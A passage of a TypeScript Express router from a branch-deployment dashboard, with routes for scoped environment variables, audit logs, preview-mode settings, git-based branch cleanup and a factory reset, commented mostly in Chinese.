    }
    // Phase 8 — 项目级 scope 同时返回 envMeta + missingRequired,UI 弹窗一次拿到全部数据
    //
    // Bugbot fix(PR #521 第十一轮 Bug 2)— 同时返回 globalEnv,让 UI 能区分
    // "项目级未填但已被全局填了"vs"项目级 + 全局都没填"。原行为:env 只含
    // 项目 scope 的值,而 missingRequiredEnvKeys 是按 merged(global ⊕ project)
    // 算的,导致 UI 上一个全局已填的 required key 既不显示值也不报 missing,
    // 视觉上"空白但不告警"产生数据错觉。
    const env = stateService.getCustomEnvScope(scope);
    if (scope !== '_global') {
      const project = stateService.getProject(scope);
      if (project) {
        const envMeta = stateService.getEnvMeta(scope);
        const missingRequiredEnvKeys = stateService.getMissingRequiredEnvKeys(scope);
        const globalEnv = stateService.getCustomEnvScope('_global');
        res.json({ env, scope, envMeta, missingRequiredEnvKeys, globalEnv });
        return;
      }
    }
    res.json({ env, scope });
  });

  // Phase 9.5 — env 修改审计日志读取:GET /api/env/audit?scope=<projectId>
  //
  // Bugbot fix(PR #521 第十轮 Bug 2)— 静态路径 /env/audit 必须排在任何
  // 形如 GET /env/:key 的参数化路径之前,即使当前没有 GET /env/:key,也提前
  // 锁住注册顺序,避免后人随手加 :key 把 /audit 当成 key 名截胡。
  // resolveScope 已防御性地处理 GET 请求(Express 通常不解析 GET body,
  // typeof req.body === 'object' 检查会让 fromBody 走假分支,scope 兜底 _global)。
  router.get('/env/audit', (req, res) => {
    const scope = resolveScope(req);
    if (scope === '_global' || scope === '_all') {
      res.status(400).json({ error: '审计日志只对项目级 scope 可用' });
      return;
    }
    if (!stateService.getProject(scope)) {
      res.status(404).json({ error: `项目 '${scope}' 不存在` });
      return;
    }
    res.json({ scope, entries: stateService.getEnvChangeLog(scope) });
  });

  // Helper: sync CDS-relevant env vars into runtime config.
  // Only reads _global — cross-project config can't be project-scoped.
  function syncCdsConfig() {
    const env = stateService.getCustomEnvScope('_global');
    if (env.ROOT_DOMAINS) config.rootDomains = env.ROOT_DOMAINS.split(',').map(v => v.trim()).filter(Boolean);
    if (env.SWITCH_DOMAIN) config.switchDomain = env.SWITCH_DOMAIN;
    if (env.MAIN_DOMAIN) config.mainDomain = env.MAIN_DOMAIN;
    if (env.DASHBOARD_DOMAIN) config.dashboardDomain = env.DASHBOARD_DOMAIN;
    if (env.PREVIEW_DOMAIN) config.previewDomain = env.PREVIEW_DOMAIN;
    if (config.rootDomains?.length) {
      if (!env.MAIN_DOMAIN) config.mainDomain = config.rootDomains[0];
      if (!env.DASHBOARD_DOMAIN) config.dashboardDomain = config.rootDomains[0];
      if (!env.PREVIEW_DOMAIN) config.previewDomain = config.rootDomains[0];
    }
    // Repo root & worktree base: allow UI override for directory isolation.
    // P4 Part 18 (G1.2): WorktreeService is now stateless, so we just
    // mutate config.repoRoot — call-sites read it via config or via
    // stateService.getProjectRepoRoot(projectId, config.repoRoot).
    if (env.CDS_REPO_ROOT) {
      config.repoRoot = env.CDS_REPO_ROOT;
    }
    if (env.CDS_WORKTREE_BASE) config.worktreeBase = env.CDS_WORKTREE_BASE;
  }

  router.put('/env', (req, res) => {
    const { scope, fromBody } = resolveScopeAndSource(req);
    if (scope === '_all') {
      res.status(400).json({ error: '_all 仅用于读取，写入请指定具体 scope' });
      return;
    }
    const rawBody = req.body as Record<string, string>;
    if (!rawBody || typeof rawBody !== 'object') {
      res.status(400).json({ error: '请求体必须是键值对对象' });
      return;
    }
    // Phase 7 fix(B14,2026-05-01):剔除 'scope' 元字段,避免它被当成名为
    // "scope" 的 env var 污染。两种调用方式都正确处理:
    //   ① ?scope=<sid> + body 是纯 env dict          → 等价旧行为
    //   ② body 含 { scope: <sid>, KEY: VAL, ... }    → resolveScope 取 body.scope,
    //      setCustomEnv 收到去掉 scope 的 dict
    //
    // Bugbot fix(PR #521 第九轮 Bug 1)— 仅当 body.scope 用作 meta 字段
    //(即 ?scope= 缺失,scope 来自 body)时才剥;若 ?scope= 已显式指定,
    // body.scope 是用户真实想存的 env var,不能默默丢。
    const env: Record<string, string> = {};
    for (const [k, v] of Object.entries(rawBody)) {
      if (k === 'scope' && fromBody) continue;
      env[k] = v;
    }
    stateService.setCustomEnv(env, scope);
    // Phase 8 — 项目级 env 修改时同步 defaultEnv,作为新分支创建时的继承模板。
    //
    // Bugbot fix(PR #521 第九轮 Bug 2)— defaultEnv 改回整体替换(替代第八轮的
    // merge 实现)。理由:PUT /env 的 customEnv 是 bulk-replace,defaultEnv 作为
    // "新分支继承模板"应当与 customEnv 严格同步,否则用户 PUT 整体 env 后会
    // 残留旧 key,新分支继承时把删掉的密钥/废弃配置又拉回来。删除单 key 走
    // DELETE /env/:key,已显式 sync defaultEnv(Phase 9.5)。
    if (scope !== '_global' && stateService.getProject(scope)) {
      stateService.setDefaultEnv(scope, env);
      // Phase 9.5 — 审计日志:记录 bulk-replace 操作 + 涉及的 keys
      stateService.appendEnvChangeLog(scope, {
        op: 'bulk-replace',
        keys: Object.keys(env),
        actor: resolveActorFromRequest(req),
        source: 'api',
      });
    }
    stateService.save();
    syncCdsConfig();
    res.json({ message: '环境变量已更新', env, scope });
  });

  router.put('/env/:key', (req, res) => {
    const { key } = req.params;
    const { value } = req.body as { value?: string };
    if (value === undefined) {
      res.status(400).json({ error: '值不能为空' });
      return;
    }
    const scope = resolveScope(req);
    if (scope === '_all') {
      res.status(400).json({ error: '_all 仅用于读取' });
      return;
    }
    stateService.setCustomEnvVar(key, value, scope);
    // Phase 8 — 项目级单 key 修改时同步 defaultEnv(新分支继承)
    if (scope !== '_global' && stateService.getProject(scope)) {
      const current = stateService.getDefaultEnv(scope);
      current[key] = value;
      stateService.setDefaultEnv(scope, current);
      // Phase 9.5 — 审计:single key set
      stateService.appendEnvChangeLog(scope, {
        op: 'set',
        keys: [key],
        actor: resolveActorFromRequest(req),
        source: 'api',
      });
    }
    stateService.save();
    syncCdsConfig();
    res.json({ message: `Set ${key}`, scope });
  });

  router.delete('/env/:key', (req, res) => {
    const { key } = req.params;
    const scope = resolveScope(req);
    if (scope === '_all') {
      res.status(400).json({ error: '_all 仅用于读取' });
      return;
    }
    stateService.removeCustomEnvVar(key, scope);
    // Bugbot fix(PR #521)+ Codex P2:同步从 defaultEnv 删,否则 PUT /env*
    // 已删的 key 还在 defaultEnv 模板里,新分支创建时会被 inheritDefaultEnv 复活
    //(典型场景:用户删了一个泄漏的 SMTP 密码,下次 webhook 自动建分支又把它注回去)
    if (scope !== '_global' && stateService.getProject(scope)) {
      const current = stateService.getDefaultEnv(scope);
      if (key in current) {
        delete current[key];
        stateService.setDefaultEnv(scope, current);
      }
      // Phase 9.5 — 审计:delete
      stateService.appendEnvChangeLog(scope, {
        op: 'delete',
        keys: [key],
        actor: resolveActorFromRequest(req),
        source: 'api',
      });
    }
    stateService.save();
    res.json({ message: `Deleted ${key}`, scope });
  });

  // ── Smart categorize: 把全局 customEnv 整理成「CDS 读全局 / 项目读项目」两套独立副本 ──
  //
  // 背景（2026-04-27 用户反馈）：dashboard「全局」customEnv 塞了 17 个
  // prd-api 项目变量。用户要彻底隔离：
  //   - CDS 读全局（CDS_* 和历史无前缀名 JWT_SECRET / PREVIEW_DOMAIN 等
  //     —— syncCdsConfig() 在第 3826-3845 行真的从 _global 读它们）
  //   - 项目读项目（project.customEnv）
  //   - 历史重名（如 JWT_SECRET）= 两边都需要 → **复制成两份独立副本**
  //
  // classifyEnvKey 的三类对应三种处理：
  //   cds-canonical (CDS_*)    → 留全局，不复制（项目用不上）
  //   cds-legacy (JWT_SECRET)  → 留全局 + 复制一份到项目
  //                              （CDS 读全局副本，项目读项目副本，互不影响）
  //   unknown (GITHUB_PAT 等)  → 移到项目（CDS 不读，全局删）
  //
  // 撞名（项目里已有同名变量）：以项目里现有的为准，不覆盖；
  //   legacy 撞名 → 全局留 + 项目保持原值（两边各有各的）
  //   unknown 撞名 → 全局删 + 项目保持原值
  //
  // dryRun=true 只返回 plan 不改 state；false 则按 plan 真改 + save。
  router.post('/env/categorize', (req, res) => {
    const body = (req.body || {}) as { targetProjectId?: string; dryRun?: boolean };
    const targetProjectId = (body.targetProjectId || '').trim();
    const dryRun = body.dryRun === true;
    if (!targetProjectId) {
      res.status(400).json({ error: '缺少 targetProjectId（移到哪个项目）' });
      return;
    }
    if (targetProjectId === '_global' || targetProjectId === '_all') {
      res.status(400).json({ error: 'targetProjectId 不能是 _global 或 _all' });
      return;
    }
    const targetProject = stateService.getProject(targetProjectId);
    if (!targetProject) {
      res.status(404).json({ error: `项目 "${targetProjectId}" 不存在` });
      return;
    }

    const globalEnv = stateService.getCustomEnvScope('_global');
    const projectEnv = stateService.getCustomEnvScope(targetProjectId);

    // 计划：每个全局变量的处置 = (是否写项目, 是否从全局删, 是否撞名)
    // entry.flow ∈
    //   'global-only'      只 CDS 用，全局保留，项目不复制（CDS_*）
    //   'duplicate'        两边都需要，全局保留 + 复制到项目 (legacy 不撞名)
    //   'duplicate-skip'   legacy 撞名：全局保留，项目保持原值（两边各自隔离）
    //   'move'             unknown：从全局删除 + 写到项目
    //   'move-skip'        unknown 撞名：全局删除，项目保持原值
    type Flow = 'global-only' | 'duplicate' | 'duplicate-skip' | 'move' | 'move-skip';
    const plan: Array<{ key: string; value: string; flow: Flow; classification: string; projectExisting?: string }> = [];

    for (const [key, value] of Object.entries(globalEnv)) {
      const cls = classifyEnvKey(key);
      const projectHas = Object.prototype.hasOwnProperty.call(projectEnv, key);
      const projectVal = projectHas ? projectEnv[key] : undefined;
      let flow: Flow;
      if (cls === 'cds-canonical') {
        flow = 'global-only';
      } else if (cls === 'cds-legacy') {
        flow = projectHas && projectVal !== value ? 'duplicate-skip' : 'duplicate';
      } else {
        flow = projectHas && projectVal !== value ? 'move-skip' : 'move';
      }
      plan.push({ key, value, flow, classification: cls, projectExisting: projectVal });
    }

    if (!dryRun) {
      for (const entry of plan) {
        if (entry.flow === 'duplicate') {
          // 两边都写：全局原本就有，项目复制
          stateService.setCustomEnvVar(entry.key, entry.value, targetProjectId);
        } else if (entry.flow === 'move') {
          // 移：项目写 + 全局删
          stateService.setCustomEnvVar(entry.key, entry.value, targetProjectId);
          stateService.removeCustomEnvVar(entry.key, '_global');
        } else if (entry.flow === 'move-skip') {
          // 撞名 + unknown：项目保留原值，全局删
          stateService.removeCustomEnvVar(entry.key, '_global');
        }
        // global-only / duplicate-skip：什么都不做
      }
      stateService.save();
    }

    // 给前端友好的统计 + 分组
    const groups = {
      duplicated: plan.filter(p => p.flow === 'duplicate').map(p => p.key),       // 复制到项目（legacy）
      duplicateSkipped: plan.filter(p => p.flow === 'duplicate-skip').map(p => p.key), // legacy 撞名（两边独立留）
      moved: plan.filter(p => p.flow === 'move').map(p => p.key),                 // 从全局移到项目
      moveSkipped: plan.filter(p => p.flow === 'move-skip').map(p => p.key),      // unknown 撞名（项目原值优先）
      globalOnly: plan.filter(p => p.flow === 'global-only').map(p => p.key),     // CDS_* 留全局
    };

    res.json({
      dryRun,
      targetProjectId,
      groups,
      summary: {
        duplicatedCount: groups.duplicated.length,
        duplicateSkippedCount: groups.duplicateSkipped.length,
        movedCount: groups.moved.length,
        moveSkippedCount: groups.moveSkipped.length,
        globalOnlyCount: groups.globalOnly.length,
        // 总改动数（用户最关心的"会动几个"）
        changeCount: groups.duplicated.length + groups.moved.length + groups.moveSkipped.length,
      },
    });
  });

  // ── Mirror acceleration ──

  router.get('/mirror', (_req, res) => {
    res.json({ enabled: stateService.isMirrorEnabled() });
  });

  router.put('/mirror', (req, res) => {
    const { enabled } = req.body as { enabled?: boolean };
    if (typeof enabled !== 'boolean') {
      res.status(400).json({ error: 'enabled 必须是布尔值' });
      return;
    }
    stateService.setMirrorEnabled(enabled);
    stateService.save();
    res.json({ message: enabled ? '镜像加速已开启' : '镜像加速已关闭', enabled });
  });

  // ── Tab title override ──

  router.get('/tab-title', (_req, res) => {
    res.json({ enabled: stateService.isTabTitleEnabled() });
  });

  router.put('/tab-title', (req, res) => {
    const { enabled } = req.body as { enabled?: boolean };
    if (typeof enabled !== 'boolean') {
      res.status(400).json({ error: 'enabled 必须是布尔值' });
      return;
    }
    stateService.setTabTitleEnabled(enabled);
    stateService.save();
    res.json({ message: enabled ? '标签页标题已开启' : '标签页标题已关闭', enabled });
  });

  // ── Preview mode (per-project，PR_A 之后) ──
  //
  // GET ?projectId=xxx   → 该项目的 mode（fallback 到 legacy state.previewMode）
  // GET 不带 projectId   → legacy state.previewMode（兼容老 settings 页）
  // PUT body { mode, projectId? } → projectId 给则写项目，不给则写 legacy

  // 2026-04-27 边界整理：preview-mode 现在主路径是
  // GET/PUT /api/projects/:id/preview-mode（projects.ts 注册）。
  // 老路径保留兼容，加 Deprecation 响应头让调用方（外部 Agent）能感知。
  router.get('/preview-mode', (req, res) => {
    const projectId = typeof req.query.projectId === 'string' ? req.query.projectId : undefined;
    res.setHeader('Deprecation', 'true');
    res.setHeader('Link', '</api/projects/' + (projectId || '<projectId>') + '/preview-mode>; rel="successor-version"');
    res.json({ mode: stateService.getPreviewModeFor(projectId) });
  });

  router.put('/preview-mode', (req, res) => {
    const { mode, projectId } = req.body as { mode?: string; projectId?: string };
    if (mode !== 'simple' && mode !== 'port' && mode !== 'multi') {
      res.status(400).json({ error: "mode 必须是 'simple' | 'port' | 'multi'" });
      return;
    }
    if (projectId && stateService.getProject(projectId)) {
      stateService.setProjectPreviewMode(projectId, mode);
    } else {
      stateService.setPreviewMode(mode);
    }
    stateService.save();
    res.setHeader('Deprecation', 'true');
    res.setHeader('Link', '</api/projects/' + (projectId || '<projectId>') + '/preview-mode>; rel="successor-version"');
    const labels: Record<string, string> = { simple: '简洁', port: '端口直连', multi: '子域名' };
    res.json({ message: `预览模式已切换为：${labels[mode]}`, mode });
  });

  // ── Config (read-only) ──

  router.get('/config', async (_req, res) => {
    const customEnv = stateService.getCustomEnv();

    // GitHub repo URL: prefer explicit config from UI env vars, fallback to git remote auto-detection
    let githubRepoUrl = customEnv.GITHUB_REPO_URL || '';
    if (!githubRepoUrl) {
      try {
        const result = await shell.exec('git remote get-url origin', { cwd: config.repoRoot, timeout: 5000 });
        const remote = result.stdout.trim();
        // Match patterns: git@github.com:owner/repo.git, https://github.com/owner/repo.git, or proxy /git/owner/repo
        const sshMatch = remote.match(/github\.com[:/]([^/]+\/[^/.]+)/);
        const httpMatch = remote.match(/github\.com\/([^/]+\/[^/.]+)/);
        const proxyMatch = remote.match(/\/git\/([^/]+\/[^/.]+)/);
        const match = sshMatch || httpMatch || proxyMatch;
        if (match) {
          githubRepoUrl = `https://github.com/${match[1].replace(/\.git$/, '')}`;
        }
      } catch { /* ignore */ }
    }

    // CDS git commit short hash for version identification
    let cdsCommitHash = '';
    try {
      const result = await shell.exec('git rev-parse --short HEAD', { cwd: config.repoRoot, timeout: 3000 });
      cdsCommitHash = result.stdout.trim();
    } catch { /* ignore */ }

    res.json({
      ...config,
      githubRepoUrl,
      cdsCommitHash,
      jwt: { ...config.jwt, secret: '***' },
      executorToken: config.executorToken ? '***' : undefined,
      sharedEnv: Object.fromEntries(
        Object.entries(config.sharedEnv).map(([k, v]) => [k, k.includes('PASSWORD') || k.includes('SECRET') ? '***' : v]),
      ),
      executors: Object.values(stateService.getExecutors()),
      previewMode: stateService.getPreviewMode(),
    });
  });

  // ── Check updates (compare local vs remote for all branches) ──

  router.get('/check-updates', async (_req, res) => {
    const state = stateService.getState();
    const branches = Object.values(state.branches);

    // Fetch latest remote refs once
    try {
      await shell.exec(
        'GIT_TERMINAL_PROMPT=0 git fetch origin --prune',
        { cwd: config.repoRoot, timeout: 30_000 },
      );
    } catch {
      // If fetch fails, we can still compare with last known remote state
    }

    const updates: Record<string, { behind: number; latestRemoteSubject?: string }> = {};

    await Promise.all(branches.map(async (b) => {
      try {
        // Count commits local is behind remote
        const behindResult = await shell.exec(
          `git rev-list --count HEAD..origin/${b.branch} 2>/dev/null || echo 0`,
          { cwd: b.worktreePath, timeout: 10_000 },
        );
        const behind = parseInt(behindResult.stdout.trim()) || 0;

        let latestRemoteSubject: string | undefined;
        if (behind > 0) {
          const subjectResult = await shell.exec(
            `git log -1 --format=%s origin/${b.branch}`,
            { cwd: b.worktreePath, timeout: 5_000 },
          );
          latestRemoteSubject = subjectResult.stdout.trim();
        }

        if (behind > 0) {
          updates[b.id] = { behind, latestRemoteSubject };
        }
      } catch {
        // Branch may not have a remote tracking branch — skip
      }
    }));

    res.json({ updates });
  });

  // ── Cleanup all non-default branches ──

  // ── Cleanup cross-project service pollution ──
  //
  // During the pre-project-scoped era a branch's entry.services could
  // accidentally collect service records for profiles that belong to
  // OTHER projects (most often when a deploy iterated the global
  // buildProfiles list rather than project-scoped). After fixing the
  // root cause, these stale entries still sit in state.json and show
  // up in the dashboard as ghost chips.
  //
  // This endpoint walks every branch, cross-references its entry.services
  // against the set of profiles that actually belong to its projectId,
  // and drops any entry whose profile belongs to someone else. It also
  // best-effort stops the orphan container if any is running.
  //
  // Idempotent, safe to run multiple times. Returns a summary so the
  // operator can see what was trimmed.
  router.post('/cleanup-cross-project-services', async (_req, res) => {
    try {
      const allBranches = Object.values(stateService.getState().branches || {});
      const trimmed: Array<{ branchId: string; dropped: string[] }> = [];

      for (const entry of allBranches) {
        const ownProjectId = entry.projectId || 'default';
        const ownProfileIds = new Set(
          stateService.getBuildProfilesForProject(ownProjectId).map((p) => p.id),
        );
        const dropped: string[] = [];
        for (const profileId of Object.keys(entry.services || {})) {
          if (!ownProfileIds.has(profileId)) {
            // Best-effort stop the orphan container.
            const svc = entry.services[profileId];
            if (svc?.containerName) {
              try { await containerService.stop(svc.containerName); } catch { /* already gone */ }
            }
            delete entry.services[profileId];
            dropped.push(profileId);
          }
        }
        if (dropped.length > 0) {
          trimmed.push({ branchId: entry.id, dropped });
        }
      }
      if (trimmed.length > 0) stateService.save();

      res.json({
        trimmedCount: trimmed.reduce((a, t) => a + t.dropped.length, 0),
        branches: trimmed,
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.post('/cleanup', async (req, res) => {
    initSSE(res);
    try {
      // Optional ?project=<id> scopes the cleanup to one project's
      // branches. Without the filter, all non-default branches across
      // every project are removed (pre-feature global behaviour).
      const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;

      const state = stateService.getState();
      const toRemove = Object.values(state.branches).filter((b) => {
        if (b.id === state.defaultBranch) return false;
        if (projectFilter && (b.projectId || 'default') !== projectFilter) return false;
        return true;
      });
      for (const entry of toRemove) {
        sendSSE(res, 'step', { step: 'cleanup', status: 'running', title: `正在删除 ${entry.id}...` });
        for (const svc of Object.values(entry.services)) {
          try { await containerService.stop(svc.containerName); } catch { /* ok */ }
        }
        try {
          const repoRoot = stateService.getProjectRepoRoot(entry.projectId, config.repoRoot);
          await worktreeService.remove(repoRoot, entry.worktreePath);
        } catch { /* ok */ }
        stateService.removeLogs(entry.id);
        stateService.removeBranch(entry.id);
        sendSSE(res, 'step', { step: 'cleanup', status: 'done', title: `已删除 ${entry.id}` });
      }
      stateService.save();
      const msg = projectFilter
        ? `已清理项目 ${projectFilter} 的 ${toRemove.length} 个分支`
        : `已清理 ${toRemove.length} 个分支`;
      sendSSE(res, 'complete', { message: msg, removedCount: toRemove.length, scope: projectFilter || '_all' });
    } catch (err) {
      sendSSE(res, 'error', { message: (err as Error).message });
    } finally {
      res.end();
    }
  });

  // ── Cleanup orphan branches: remove local branches that no longer exist on remote ──

  router.post('/cleanup-orphans', async (req, res) => {
    initSSE(res);
    try {
      // Optional ?project=<id> filter — when the Dashboard is on a
      // specific project page, we only scan/clean that project's
      // branches. Without the filter we fan out to every project so
      // a global "cleanup orphans" from the top-level still works.
      const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;

      const projects = projectFilter
        ? [stateService.getProject(projectFilter)].filter(Boolean) as ReturnType<typeof stateService.getProjects>
        : stateService.getProjects();

      if (projects.length === 0) {
        sendSSE(res, 'complete', { message: projectFilter ? `未知项目: ${projectFilter}` : '没有项目', orphanCount: 0 });
        res.end();
        return;
      }

      // Per-project: resolve repoRoot, fetch remote, intersect with that
      // project's branch entries. Legacy projects without a custom
      // repoPath fall back to config.repoRoot via getProjectRepoRoot.
      // A project whose clone isn't ready (cloneStatus !== 'ready')
      // is skipped — it has no remote to check against.
      const allOrphans: BranchEntry[] = [];
      for (const project of projects) {
        if (project.cloneStatus && project.cloneStatus !== 'ready') {
          sendSSE(res, 'step', { step: `skip-${project.id}`, status: 'info', title: `跳过项目 ${project.name}（clone 未就绪）` });
          continue;
        }
        const projectRepoRoot = stateService.getProjectRepoRoot(project.id, config.repoRoot);
        sendSSE(res, 'step', { step: `fetch-${project.id}`, status: 'running', title: `拉取 ${project.name} 的远程分支...` });
        try {
          await shell.exec(
            'GIT_TERMINAL_PROMPT=0 git fetch origin --prune',
            { cwd: projectRepoRoot, timeout: 30_000 },
          );
        } catch (err) {
          sendSSE(res, 'step', { step: `fetch-${project.id}`, status: 'error', title: `${project.name} fetch 失败: ${(err as Error).message}` });
          continue;
        }
        const result = await shell.exec(
          'git for-each-ref --format="%(refname:lstrip=3)" refs/remotes/origin',
          { cwd: projectRepoRoot },
        );
        const remoteBranches = new Set(
          result.stdout.trim().split('\n').filter(Boolean).filter(b => b !== 'HEAD'),
        );
        const projectBranches = stateService.getBranchesForProject(project.id);
        const projectOrphans = projectBranches.filter(b => !remoteBranches.has(b.branch));
        sendSSE(res, 'step', { step: `fetch-${project.id}`, status: 'done', title: `${project.name}: 远程 ${remoteBranches.size} 个分支, 本地 ${projectBranches.length} 个, 孤儿 ${projectOrphans.length} 个` });
        allOrphans.push(...projectOrphans);
      }

      const orphans = allOrphans;

      if (orphans.length === 0) {
        sendSSE(res, 'complete', { message: '没有发现孤儿分支，一切正常', orphanCount: 0 });
        res.end();
        return;
      }

      sendSSE(res, 'step', { step: 'scan', status: 'info', title: `发现 ${orphans.length} 个孤儿分支`, detail: { orphans: orphans.map(b => ({ id: b.id, branch: b.branch })) } });

      // Step 3: stop containers + remove worktrees in parallel, then update state
      await Promise.all(orphans.map(async (entry) => {
        sendSSE(res, 'step', { step: `cleanup-${entry.id}`, status: 'running', title: `正在清理 ${entry.branch}...` });

        // Stop all containers for this orphan in parallel
        await Promise.all(
          Object.values(entry.services).map(svc =>
            containerService.stop(svc.containerName).catch(() => { /* ok */ }),
          ),
        );
        // Remove worktree
        try {
          const repoRoot = stateService.getProjectRepoRoot(entry.projectId, config.repoRoot);
          await worktreeService.remove(repoRoot, entry.worktreePath);
        } catch { /* ok */ }

        sendSSE(res, 'step', { step: `cleanup-${entry.id}`, status: 'done', title: `已清理 ${entry.branch}` });
      }));

      // State mutations are serial (state is in-memory, no async needed)
      for (const entry of orphans) {
        stateService.removeLogs(entry.id);
        stateService.removeBranch(entry.id);
      }
      const cleaned = orphans.length;

      stateService.save();
      sendSSE(res, 'complete', { message: `已清理 ${cleaned} 个孤儿分支`, orphanCount: cleaned });
    } catch (err) {
      sendSSE(res, 'error', { message: (err as Error).message });
    } finally {
      res.end();
    }
  });

  // ── Prune stale local git branches not in CDS deployment list ──

  router.post('/prune-stale-branches', async (req, res) => {
    initSSE(res);
    try {
      // Optional ?project=<id> filter — same semantics as cleanup-orphans.
      // Without a filter we walk every project so state-level "prune
      // everything" still works. Each project has its own git repo and
      // its own list of deployed branches, so the protected set is
      // computed per-project.
      const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;
      const projects = projectFilter
        ? [stateService.getProject(projectFilter)].filter(Boolean) as ReturnType<typeof stateService.getProjects>
        : stateService.getProjects();

      if (projects.length === 0) {
        sendSSE(res, 'complete', { message: projectFilter ? `未知项目: ${projectFilter}` : '没有项目', pruneCount: 0 });
        res.end();
        return;
      }

      let totalPruned = 0;
      for (const project of projects) {
        if (project.cloneStatus && project.cloneStatus !== 'ready') {
          sendSSE(res, 'step', { step: `skip-${project.id}`, status: 'info', title: `跳过项目 ${project.name}（clone 未就绪）` });
          continue;
        }
        const projectRepoRoot = stateService.getProjectRepoRoot(project.id, config.repoRoot);

        // What's "deployed" for this project = the branches we've
        // registered in CDS under this projectId. Cross-project
        // branches (e.g. default's 'main' when scanning prd-agent-2)
        // must NOT be considered deployed here, or we'd keep fork
        // branches named 'main' as stale just because default has one.
        const projectDeployed = new Set(
          stateService.getBranchesForProject(project.id).map(b => b.branch),
        );

        let currentBranch = '';
        try {
          const currentResult = await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: projectRepoRoot });
          currentBranch = currentResult.stdout.trim();
        } catch {
          sendSSE(res, 'step', { step: `scan-${project.id}`, status: 'error', title: `${project.name}: 读 HEAD 失败` });
          continue;
        }
        const protectedBranches = new Set([currentBranch, 'main', 'master', 'develop', 'dev']);

        sendSSE(res, 'step', { step: `scan-${project.id}`, status: 'running', title: `扫描 ${project.name} 的本地分支...` });
        const localResult = await shell.exec('git branch --format="%(refname:short)"', { cwd: projectRepoRoot });
        const localBranches = localResult.stdout.trim().split('\n').filter(Boolean);
        const staleBranches = localBranches.filter(b =>
          !projectDeployed.has(b) && !protectedBranches.has(b),
        );
        sendSSE(res, 'step', {
          step: `scan-${project.id}`, status: 'done',
          title: `${project.name}: 本地 ${localBranches.length}, 已部署 ${projectDeployed.size}, 待清 ${staleBranches.length}`,
        });
        for (const branch of staleBranches) {
          sendSSE(res, 'step', { step: `del-${project.id}-${branch}`, status: 'running', title: `删除 ${project.name} / ${branch}...` });
          try {
            await shell.exec(`git branch -D "${branch}"`, { cwd: projectRepoRoot });
            totalPruned++;
            sendSSE(res, 'step', { step: `del-${project.id}-${branch}`, status: 'done', title: `已删除 ${project.name} / ${branch}` });
          } catch (err) {
            sendSSE(res, 'step', { step: `del-${project.id}-${branch}`, status: 'error', title: `删除失败 ${project.name} / ${branch}: ${(err as Error).message}` });
          }
        }
      }

      sendSSE(res, 'complete', { message: `已清理 ${totalPruned} 个非列表分支`, pruneCount: totalPruned });
    } catch (err) {
      sendSSE(res, 'error', { message: (err as Error).message });
    } finally {
      res.end();
    }
  });

  // ── Factory reset: stop all containers, clear all config, keep Docker volumes ──

  router.post('/factory-reset', async (req, res) => {
    initSSE(res);
    try {
      // Optional ?project=<id> scopes the reset to that project only:
      //   - stop/remove only that project's containers + worktrees
      //   - clear only that project's buildProfiles / infra / routing
      //   - clear only that project's customEnv bucket (_global untouched)
      //   - the Project entity itself stays (so the user doesn't have
      //     to recreate it + re-clone the repo)
      //
      // Without the filter, pre-feature behaviour applies: nuke EVERY
      // project's state and reset CDS to an empty-slate install.
      const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;
      const state = stateService.getState();

      if (projectFilter) {
        const project = stateService.getProject(projectFilter);
        if (!project) {
          sendSSE(res, 'error', { message: `项目 ${projectFilter} 不存在` });
          res.end();
          return;
        }

        // 1. Stop + remove that project's branches
        const branches = Object.values(state.branches)
          .filter((b) => (b.projectId || 'default') === projectFilter);
        for (const entry of branches) {
          sendSSE(res, 'step', { step: 'reset', status: 'running', title: `停止分支 ${entry.id}...` });
          for (const svc of Object.values(entry.services)) {
            try { await containerService.stop(svc.containerName); } catch { /* ok */ }
          }
          try {
            const repoRoot = stateService.getProjectRepoRoot(entry.projectId, config.repoRoot);
            await worktreeService.remove(repoRoot, entry.worktreePath);
          } catch { /* ok */ }
          stateService.removeLogs(entry.id);
          stateService.removeBranch(entry.id);
        }

        // 2. Stop + remove that project's infra containers (volumes preserved).
        //    We intentionally call getInfraServicesForProject before mutation
        //    and container operations so a partial failure still reports
        //    the right count.
        const infra = stateService.getInfraServicesForProject(projectFilter);
        for (const svc of infra) {
          sendSSE(res, 'step', { step: 'reset', status: 'running', title: `停止基础设施 ${svc.name}...` });
          try { await containerService.stop(svc.containerName); } catch { /* ok */ }
        }

        // 3. Remove this project's profiles / infra / routing / env bucket
        //    from state. Keep the Project entity + its dockerNetwork so
        //    the user doesn't have to recreate the project shell.
        //    getState() returns Readonly<CdsState>; cast away so we can
        //    replace the arrays in place (the same pattern as the
        //    global-reset branch below).
        const removedProfiles = stateService
          .getBuildProfilesForProject(projectFilter).length;
        const mutableState = state as unknown as {
          buildProfiles: BuildProfile[];
          infraServices: InfraService[];
          routingRules: RoutingRule[];
        };
        mutableState.buildProfiles = (state.buildProfiles || [])
          .filter((p) => (p.projectId || 'default') !== projectFilter);
        mutableState.infraServices = (state.infraServices || [])
          .filter((s) => (s.projectId || 'default') !== projectFilter);
        mutableState.routingRules = (state.routingRules || [])
          .filter((r) => (r.projectId || 'default') !== projectFilter);
        stateService.dropCustomEnvScope(projectFilter);
        stateService.save();

        sendSSE(res, 'complete', {
          message: `项目 ${project.name} 已重置：清除 ${branches.length} 个分支、${infra.length} 个基础设施、${removedProfiles} 个构建配置、环境变量作用域。项目实体 + Docker 数据卷保留。`,
          scope: projectFilter,
          removedBranches: branches.length,
          removedInfra: infra.length,
          removedProfiles,
        });
        return;
      }

      // ── Global factory-reset (all projects) — pre-feature path ──

      // 1. Stop and remove all branch containers + worktrees
      const branches = Object.values(state.branches);
      for (const entry of branches) {
        sendSSE(res, 'step', { step: 'reset', status: 'running', title: `停止分支 ${entry.id}...` });
        for (const svc of Object.values(entry.services)) {
          try { await containerService.stop(svc.containerName); } catch { /* ok */ }
        }
        try {
          const repoRoot = stateService.getProjectRepoRoot(entry.projectId, config.repoRoot);
          await worktreeService.remove(repoRoot, entry.worktreePath);
        } catch { /* ok */ }
      }

      // 2. Stop and remove all infra service containers (volumes preserved)
      for (const svc of state.infraServices) {
        sendSSE(res, 'step', { step: 'reset', status: 'running', title: `停止基础设施 ${svc.name}...` });
        try { await containerService.stop(svc.containerName); } catch { /* ok */ }
      }

      // 3. Clear all state (but keep the file — it will be overwritten with defaults)
      const freshState: typeof state = {
